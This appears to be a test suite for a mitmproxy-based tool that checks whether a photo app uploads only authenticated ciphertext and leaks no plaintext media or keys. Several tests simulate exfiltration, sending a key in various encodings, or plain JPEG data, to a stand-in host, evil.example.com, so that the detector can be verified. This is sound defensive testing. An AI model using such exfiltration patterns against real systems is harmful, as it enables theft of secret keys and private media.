"""Tests for the capture tools. They need mitmproxy's bundled Python:

    mitmdump -ns verify/capture/test_capture_report.py
"""
import sys

sys.dont_write_bytecode = True

import base64
import gzip
import hashlib
import json
import os
import shutil
import struct
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from urllib.parse import quote

from mitmproxy import connection, http, tcp

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import bypass_check
import capture_report
from capture_report import CaptureReport, decode_secret, forms_of, open_cln1

SAMPLES = Path(__file__).resolve().parent.parent / "samples"
PUBLIC_KEY = "7557e96eb4cb9265d07f285b0f850957cec7c9ed238ae4a402ff004074232608"
KEY_BYTES = bytes.fromhex(PUBLIC_KEY)
PHOTO = (SAMPLES / "sample-photo.cln1").read_bytes()
JPEG = (SAMPLES / "sample-photo.jpg").read_bytes()
STORAGE = "https://store.example.com/photos/1b4e28ba-2fa1-11d2-883f-0016d3cca427/original_abc.jpeg"
TOKEN = "Bearer not-a-real-token-AAAA"
SIGNATURE = "X-Amz-Signature=deadbeefcafe"
PASSED = "Observed upload check passed"
FAILED = "Observed upload check failed"
INCONCLUSIVE = "Inconclusive"


def flow(method, url, body=b"", headers=(), status=200, reply=b""):
    made = http.HTTPFlow(
        connection.Client(peername=("127.0.0.1", 50000), sockname=("127.0.0.1", 8080)),
        connection.Server(address=("store.example.com", 443)),
    )
    made.request = http.Request.make(method, url, body, dict(headers))
    made.response = http.Response.make(status, reply)
    return made


def multipart(*parts):
    boundary = "xxBOUNDARYxx"
    body = b""
    for index, part in enumerate(parts):
        body += (
            f'--{boundary}\r\nContent-Disposition: form-data; name="f{index}"\r\n\r\n'.encode()
            + part + b"\r\n"
        )
    return body + f"--{boundary}--\r\n".encode(), {"content-type": f"multipart/form-data; boundary={boundary}"}


class Case(unittest.TestCase):
    def setUp(self):
        self.folder = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.folder)

    def report(self, keys=(PUBLIC_KEY,), canaries=(), connections=None, bypass=None):
        """A second-pass report over a run with nothing refused, unless a test says otherwise."""
        key_file = None
        if keys is not None:
            key_file = self.folder / "keys.txt"
            key_file.write_text("\n".join(keys))
        (self.folder / "connections.json").write_text(json.dumps({"refused": connections or {}}))
        if bypass is not None:
            (self.folder / "bypass.json").write_text(json.dumps(bypass))
        return CaptureReport(self.folder, key_file=key_file, canaries=canaries, offline=True)

    def finish(self, report):
        report.done()
        return report.verdict()[0], (self.folder / "report.md").read_text()


class Opening(unittest.TestCase):
    def test_sample_photo_opens(self):
        opened = open_cln1(PHOTO, KEY_BYTES)
        self.assertEqual(opened["recovered"], "JPEG")
        self.assertEqual(opened["recovered_bytes"], len(JPEG))

    def test_chunked_sample_opens_every_chunk(self):
        self.assertEqual(open_cln1((SAMPLES / "sample-chunked.cln1").read_bytes(), KEY_BYTES)["chunks"], 4)

    def test_tampered_truncated_and_wrong_key_are_refused(self):
        self.assertIsNone(open_cln1((SAMPLES / "sample-tampered.cln1").read_bytes(), KEY_BYTES))
        self.assertIsNone(open_cln1((SAMPLES / "sample-truncated.cln1").read_bytes(), KEY_BYTES))
        self.assertIsNone(open_cln1(PHOTO, b"\0" * 32))

    def test_changed_header_is_refused(self):
        # The header is the authenticated data, so changing any of it must fail.
        changed = bytearray(PHOTO)
        changed[12:16] = struct.pack(">I", 99)
        self.assertIsNone(open_cln1(bytes(changed), KEY_BYTES))


class Secrets(unittest.TestCase):
    def test_every_form_is_found_at_every_alignment(self):
        forms = forms_of(KEY_BYTES)
        for prefix in (b"", b"a", b"ab"):
            data = prefix + KEY_BYTES + b"tail"
            for encoded in (base64.b64encode(data), base64.urlsafe_b64encode(data)):
                self.assertTrue(any(needle in encoded for _, needle in forms), prefix)

    def test_decoding(self):
        self.assertEqual(decode_secret(PUBLIC_KEY), KEY_BYTES)
        self.assertEqual(decode_secret(base64.b64encode(KEY_BYTES).decode()), KEY_BYTES)
        self.assertEqual(decode_secret(base64.urlsafe_b64encode(KEY_BYTES).decode().rstrip("=")), KEY_BYTES)
        self.assertIsNone(decode_secret("abcd"))
        self.assertIsNone(decode_secret("not a key!"))


class Results(Case):
    def test_pass_uses_the_agreed_wording_and_lists_what_it_did_not_check(self):
        report = self.report()
        report.response(flow("PUT", STORAGE, PHOTO))
        verdict, text = self.finish(report)
        self.assertEqual(verdict, PASSED)
        self.assertIn(
            "In the captured and successfully inspected traffic, the photo upload contained "
            "authenticated ciphertext. No plaintext media or secret keys were detected in the "
            "inspected upload traffic.",
            text,
        )
        self.assertIn("does not independently prove that every app version, device, or network path", text)
        self.assertIn("Connections that went around the proxy: there's no bypass.json", text)
        self.assertIn("authenticated, 1 chunk, JPEG", text)

    def test_report_holds_no_key_token_cookie_or_query_string(self):
        report = self.report()
        report.response(flow(
            "PUT", f"{STORAGE}?{SIGNATURE}", PHOTO,
            headers={"authorization": TOKEN, "cookie": "session=secretcookie"},
        ))
        _, text = self.finish(report)
        for form in (PUBLIC_KEY, PUBLIC_KEY.upper(), base64.b64encode(KEY_BYTES).decode()):
            self.assertNotIn(form, text)
        for private in (TOKEN, "secretcookie", SIGNATURE, "deadbeefcafe"):
            self.assertNotIn(private, text)

    def test_report_describes_a_key_record_without_copying_it(self):
        record = {"enc_meta": {"key_epoch": 3, "wrapped_dek": "c2VhbGVkLWtleS1ieXRlcw=="}}
        report = self.report()
        report.response(flow("PUT", STORAGE, PHOTO))
        report.response(flow("POST", "https://api.example.com/finalize", json.dumps(record).encode()))
        _, text = self.finish(report)
        self.assertIn("sealed key record, key epoch 3", text)
        self.assertNotIn("c2VhbGVk", text)

    def test_upload_is_saved_under_the_hash_the_inspector_shows(self):
        report = self.report()
        report.response(flow("PUT", STORAGE, PHOTO))
        _, text = self.finish(report)
        digest = hashlib.sha256(PHOTO).hexdigest()
        self.assertIn(digest, text)
        self.assertEqual((self.folder / "uploads" / f"{digest}.cln1").read_bytes(), PHOTO)

    def test_multipart_part_is_read_as_a_file(self):
        body, headers = multipart(b"small field", PHOTO)
        report = self.report()
        report.response(flow("POST", STORAGE, body, headers=headers))
        self.assertEqual(self.finish(report)[0], PASSED)

    def test_plaintext_uploads_fail(self):
        body, headers = multipart(b"small field", JPEG)
        embedded = json.dumps({"image": base64.b64encode(JPEG).decode()}).encode()
        for name, made in (
            ("plain", flow("PUT", STORAGE, JPEG)),
            ("multipart", flow("POST", STORAGE, body, headers=headers)),
            ("base64 in JSON", flow("POST", STORAGE, embedded, headers={"content-type": "application/json"})),
        ):
            with self.subTest(name):
                report = self.report()
                report.response(flow("PUT", STORAGE, PHOTO))
                report.response(made)
                verdict, text = self.finish(report)
                self.assertEqual(verdict, FAILED)
                self.assertIn("plain media", text)

    def test_key_in_traffic_fails_and_says_where_but_not_what(self):
        b64 = base64.b64encode(KEY_BYTES).decode()
        cases = {
            "hex in a query string": flow("GET", f"https://evil.example.com/x?k={PUBLIC_KEY}"),
            "upper hex in a header": flow("GET", "https://evil.example.com/x", headers={"x-k": PUBLIC_KEY.upper()}),
            "base64 in a body": flow("POST", "https://evil.example.com/x", json.dumps({"k": b64}).encode()),
            "base64url in a body": flow("POST", "https://evil.example.com/x", base64.urlsafe_b64encode(KEY_BYTES)),
            "url-encoded": flow("GET", f"https://evil.example.com/x?k={quote(KEY_BYTES)}"),
            "raw bytes": flow("POST", "https://evil.example.com/x", KEY_BYTES),
            "undeclared gzip": flow("POST", "https://evil.example.com/x", gzip.compress(PUBLIC_KEY.encode())),
            "in a response": flow("GET", "https://evil.example.com/x", reply=PUBLIC_KEY.encode()),
        }
        for name, made in cases.items():
            with self.subTest(name):
                report = self.report()
                report.response(flow("PUT", STORAGE, PHOTO))
                report.response(made)
                verdict, text = self.finish(report)
                self.assertEqual(verdict, FAILED)
                self.assertIn("evil.example.com/x", text)
                self.assertNotIn(PUBLIC_KEY, text)
                self.assertNotIn(b64, text)

    def test_a_leaked_key_is_never_repeated_wherever_it_was(self):
        long_text = PUBLIC_KEY + "x" * 40
        cases = {
            "URL path": flow("GET", f"https://evil.example.com/x/{PUBLIC_KEY}"),
            "field cut short for display": flow(
                "POST", "https://evil.example.com/x", json.dumps({"caption": long_text}).encode()
            ),
            "field as base64": flow(
                "POST", "https://evil.example.com/x",
                json.dumps({"events": [base64.b64encode(KEY_BYTES).decode()]}).encode(),
            ),
        }
        for name, made in cases.items():
            with self.subTest(name):
                report = self.report()
                report.response(flow("PUT", STORAGE, PHOTO))
                report.response(made)
                verdict, text = self.finish(report)
                self.assertEqual(verdict, FAILED)
                self.assertIn("evil.example.com", text)
                # Any long run of the key, not only the whole of it.
                self.assertNotIn(PUBLIC_KEY[:24], text)
                self.assertNotIn(base64.b64encode(KEY_BYTES).decode()[:24], text)

    def test_plain_media_over_a_socket_fails(self):
        made = tcp.TCPFlow(
            connection.Client(peername=("127.0.0.1", 50000), sockname=("127.0.0.1", 8080)),
            connection.Server(address=("evil.example.com", 9000)),
        )
        made.messages = [tcp.TCPMessage(True, JPEG)]
        report = self.report()
        report.response(flow("PUT", STORAGE, PHOTO))
        report.tcp_start(made)
        report.tcp_end(made)
        verdict, text = self.finish(report)
        self.assertEqual(verdict, FAILED)
        self.assertIn("plain media", text)

    def test_key_in_raw_tcp_fails(self):
        message = tcp.TCPMessage(True, PUBLIC_KEY.encode())
        made = tcp.TCPFlow(
            connection.Client(peername=("127.0.0.1", 50000), sockname=("127.0.0.1", 8080)),
            connection.Server(address=("evil.example.com", 9000)),
        )
        made.messages = [message]
        report = self.report()
        report.response(flow("PUT", STORAGE, PHOTO))
        report.tcp_start(made)
        report.tcp_end(made)
        self.assertEqual(self.finish(report)[0], FAILED)

    def test_other_secrets_are_searched_for_too(self):
        # A device's private key from the app's Your keys screen, as base64.
        other = base64.b64encode(b"\x07" * 32).decode()
        report = self.report(keys=(PUBLIC_KEY, other))
        report.response(flow("PUT", STORAGE, PHOTO))
        report.response(flow("POST", "https://evil.example.com/x", other.encode()))
        self.assertEqual(self.finish(report)[0], FAILED)

    def assert_inconclusive(self, report, expected):
        verdict, text = self.finish(report)
        self.assertEqual(verdict, INCONCLUSIVE)
        self.assertIn(expected, text)

    def test_first_pass_without_a_key_is_inconclusive(self):
        report = CaptureReport(self.folder, offline=False)
        report.response(flow("PUT", STORAGE, PHOTO))
        self.assert_inconclusive(report, "No key was supplied")
        self.assertTrue((self.folder / "connections.json").exists())
        self.assertFalse((self.folder / "uploads").exists())

    def test_no_upload_is_inconclusive(self):
        self.assert_inconclusive(self.report(), "No CLN1 upload was captured")

    def test_wrong_key_is_inconclusive(self):
        report = self.report(keys=("00" * 32,))
        report.response(flow("PUT", STORAGE, PHOTO))
        self.assert_inconclusive(report, "1 of 1 CLN1 uploads")

    def test_one_unopened_upload_is_enough(self):
        report = self.report()
        report.response(flow("PUT", STORAGE, PHOTO))
        report.response(flow("PUT", STORAGE, (SAMPLES / "sample-tampered.cln1").read_bytes()))
        self.assert_inconclusive(report, "1 of 2 CLN1 uploads")

    def test_malformed_cln1_is_inconclusive(self):
        report = self.report()
        report.response(flow("PUT", STORAGE, PHOTO))
        report.response(flow("PUT", STORAGE, b"CLN1" + b"\xff" * 2000))
        self.assert_inconclusive(report, "1 of 2 CLN1 uploads")

    def test_unexplained_binary_is_inconclusive(self):
        report = self.report()
        report.response(flow("PUT", STORAGE, PHOTO))
        report.response(flow("PUT", "https://elsewhere.example.com/blob", os.urandom(4096)))
        self.assert_inconclusive(report, "other large upload")

    def test_very_large_text_is_inconclusive(self):
        report = self.report()
        report.response(flow("PUT", STORAGE, PHOTO))
        report.response(flow("POST", "https://elsewhere.example.com/x", json.dumps({"d": "a" * 300_000}).encode()))
        self.assert_inconclusive(report, "other large upload")

    def test_refused_connection_from_the_live_pass_is_inconclusive(self):
        report = self.report(connections={"api.example.com": 3})
        report.response(flow("PUT", STORAGE, PHOTO))
        self.assert_inconclusive(report, "api.example.com")

    def test_live_refusal_reaches_the_second_pass(self):
        live = CaptureReport(self.folder, offline=False)
        live.tls_failed_client(SimpleNamespace(context=SimpleNamespace(
            client=SimpleNamespace(sni="api.example.com"),
            server=SimpleNamespace(address=None),
        )))
        live.done()
        key_file = self.folder / "keys.txt"
        key_file.write_text(PUBLIC_KEY)
        second = CaptureReport(self.folder, key_file=key_file, offline=True)
        second.response(flow("PUT", STORAGE, PHOTO))
        self.assert_inconclusive(second, "api.example.com")

    def test_phone_services_are_listed_but_do_not_block_a_pass(self):
        report = self.report(connections={"gsa.apple.com": 2, "mtalk.google.com": 1})
        report.response(flow("PUT", STORAGE, PHOTO))
        verdict, text = self.finish(report)
        self.assertEqual(verdict, PASSED)
        self.assertIn("TLS refused: gsa.apple.com (2x), the phone's own service", text)

    def test_general_purpose_storage_is_not_a_phone_service(self):
        report = self.report(connections={"storage.googleapis.com": 1})
        report.response(flow("PUT", STORAGE, PHOTO))
        self.assert_inconclusive(report, "storage.googleapis.com")

    def test_lost_connection_log_is_inconclusive(self):
        report = self.report()
        (self.folder / "connections.json").unlink()
        report.response(flow("PUT", STORAGE, PHOTO))
        self.assert_inconclusive(report, "connections.json")

    def test_bad_key_line_is_reported_without_echoing_it(self):
        report = self.report(keys=(PUBLIC_KEY, "oops-half-a-secret!"))
        report.response(flow("PUT", STORAGE, PHOTO))
        verdict, text = self.finish(report)
        self.assertEqual(verdict, INCONCLUSIVE)
        self.assertIn("Line 2 of the key file", text)
        self.assertNotIn("oops-half-a-secret", text)

    def test_sending_around_the_proxy(self):
        around = {"through_proxy": 5, "around": [{"address": "93.184.216.34", "name": "", "sent": 50_000, "received": 0}]}
        report = self.report(bypass=around)
        report.response(flow("PUT", STORAGE, PHOTO))
        self.assert_inconclusive(report, "went around the proxy")

    def test_apple_local_and_small_traffic_around_the_proxy_is_noise(self):
        around = {"through_proxy": 5, "around": [
            {"address": "17.253.1.1", "name": "", "sent": 900_000, "received": 0},
            {"address": "2620:149:a44::1", "name": "", "sent": 900_000, "received": 0},
            {"address": "192.168.1.9", "name": "", "sent": 900_000, "received": 0},
            {"address": "93.184.216.34", "name": "", "sent": 900, "received": 0},
        ]}
        report = self.report(bypass=around)
        report.response(flow("PUT", STORAGE, PHOTO))
        verdict, text = self.finish(report)
        self.assertEqual(verdict, PASSED)
        self.assertNotIn("Connections that went around the proxy: there's no bypass.json", text)


class Bypass(Case):
    @staticmethod
    def pcap(path, packets):
        """A pcap of raw IPv4 and IPv6 TCP packets, for tcpdump to read."""
        out = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 101)
        for src, dst, size in packets:
            payload = b"x" * size
            tcp_header = struct.pack(">HHIIBBHHH", 50000, 443, 1, 1, 5 << 4, 0x18, 1024, 0, 0)
            if ":" in src:
                ip = struct.pack(">IHBB", 6 << 28, 20 + size, 6, 64)
                ip += bypass_check.socket.inet_pton(bypass_check.socket.AF_INET6, src)
                ip += bypass_check.socket.inet_pton(bypass_check.socket.AF_INET6, dst)
            else:
                ip = struct.pack(">BBHHHBBH", 0x45, 0, 40 + size, 1, 0, 64, 6, 0)
                ip += bypass_check.socket.inet_aton(src) + bypass_check.socket.inet_aton(dst)
            frame = ip + tcp_header + payload
            out += struct.pack("<IIII", 1, 0, len(frame), len(frame)) + frame
        Path(path).write_bytes(out)

    def test_splits_traffic_when_the_phone_has_several_addresses(self):
        phone4, phone6, proxy, store = "192.168.1.5", "2a02:8084::5", "192.168.1.9", "93.184.216.34"
        apple6 = "2620:149:a44::1"
        path = self.folder / "t.pcap"
        self.pcap(path, [
            (phone4, proxy, 1000), (proxy, phone4, 200),
            (phone4, store, 700), (store, phone4, 90),
            (phone6, apple6, 300), (apple6, phone6, 40),
            (phone6, apple6, 300),
        ])
        result = bypass_check.summarise(bypass_check.read_packets(str(path)), proxy)
        self.assertEqual(result["through_proxy"], 1200)
        rows = {r["address"]: (r["sent"], r["received"]) for r in result["around"]}
        self.assertEqual(rows, {store: (700, 90), apple6: (600, 40)})

    def test_everything_through_the_proxy_leaves_nothing_around(self):
        path = self.folder / "t.pcap"
        self.pcap(path, [("192.168.1.5", "192.168.1.9", 100), ("192.168.1.9", "192.168.1.5", 100)])
        result = bypass_check.summarise(bypass_check.read_packets(str(path)), "192.168.1.9")
        self.assertEqual(result, {"through_proxy": 200, "around": []})


# mitmdump is only the way in to its Python, so exit once the tests have run.
result = unittest.TextTestRunner(stream=sys.stdout, verbosity=1).run(unittest.TestSuite(
    unittest.defaultTestLoader.loadTestsFromTestCase(case) for case in (Opening, Secrets, Results, Bypass)
))
sys.stdout.flush()
os._exit(0 if result.wasSuccessful() else 1)
